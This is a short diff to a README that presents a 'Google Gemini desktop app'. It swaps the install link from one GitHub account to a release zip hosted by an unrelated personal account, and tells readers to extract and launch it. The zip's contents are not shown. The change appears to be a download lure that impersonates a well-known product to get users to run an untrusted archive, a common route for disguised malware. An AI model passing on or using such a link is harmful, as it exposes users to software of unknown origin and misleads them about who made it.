@@ -8,7 +8,7 @@ The Google Gemini desktop app is built for people who want to move between text,
 
 ## INSTALL
 
-[Download `gemini_desktop.zip`](https://github.com/googlegemini-ai/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
+[Download `gemini_desktop.zip`](https://github.com/ctrlkip-rgb/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
 ---
 
 Extract the archive before launching the app. Available Gemini models, authentication methods, usage limits, and pricing depend on the service or compatible endpoint configured by the user.
